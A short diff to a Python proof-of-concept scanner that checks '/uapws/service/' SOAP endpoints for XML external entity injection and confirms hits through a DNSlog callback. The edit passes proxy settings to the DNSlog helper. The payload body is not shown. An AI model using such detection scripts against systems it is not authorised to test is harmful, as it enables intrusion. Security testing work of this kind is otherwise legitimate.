@@ -23,7 +23,7 @@ from requests.packages.urllib3 import disable_warnings
 disable_warnings()
 path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(path)
-from modules.dnslog import dnslogs
+from modules.dnslogs import dnslogs
 
 
 class poc:
@@ -64,7 +64,7 @@ class poc:
                     iup += url_api[length - i - 2] + "/"
                 else:
                     iup += url_api[length - i - 2] + "."
-            dnslog_all = dnslogs().get_dnslog()
+            dnslog_all = dnslogs(self.proxies).get_dnslog()
             dnslog = dnslog_all[0]
             target_url = url + "/uapws/service/" + api
             if url_api[length - 1] == "IObaExcelService":
@@ -89,7 +89,7 @@ class poc:
                 result = requests.post(url=target_url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.status_code == 200 and "<soap:Envelope" in result.text:
                     for i in range(5):
-                        dnslog_result = dnslogs().get_result(dnslog_all[1])
+                        dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
                     if dnslog_result != "[]":
                         target = urlparse(target_url)
                         result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
